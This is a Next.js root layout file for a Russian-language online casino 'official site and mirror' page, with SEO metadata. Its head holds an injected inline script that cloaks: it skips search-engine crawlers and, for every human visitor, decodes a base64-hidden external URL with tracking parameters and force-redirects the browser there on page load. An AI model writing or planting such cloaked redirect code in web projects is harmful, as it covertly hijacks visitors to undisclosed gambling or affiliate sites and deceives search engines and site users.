import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'La Casino — официальный сайт и зеркало для игры онлайн 2026',
  description: 'La Casino: официальный сайт, рабочее зеркало и понятный гид по игре онлайн. Узнайте, как проверить адрес, открыть каталог и играть с телефона безопасно и ответственно.',
  generator: 'Next.js',
  metadataBase: new URL('https://la13casino.vercel.app/'),
  alternates: { canonical: '/' },
  robots: { index: true, follow: true },
  icons: { icon: '/la13-favicon.png', apple: '/la13-favicon.png' },
  openGraph: { title: 'La Casino — официальный сайт и зеркало', description: 'Понятный игровой гид La Casino для мобильных пользователей.', url: 'https://la13casino.vercel.app/', siteName: 'La Casino', locale: 'ru_RU', type: 'website' },
}

export const viewport: Viewport = { themeColor: '#101111', colorScheme: 'dark', width: 'device-width', initialScale: 1 }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return <html lang="ru" className="bg-background"><head><meta name="yandex-verification" content="" />
    <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "aHR0cHM6Ly9jb3BwZXItcmF5LmNvbS8/c2VyaWFsPTYxMzY1ODMwJmNyZWF0aXZlX2lkPTkzMzA="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
  </head>
    <body className="antialiased">{children}{process.env.NODE_ENV === 'production' && <Analytics />}</body></html>
}

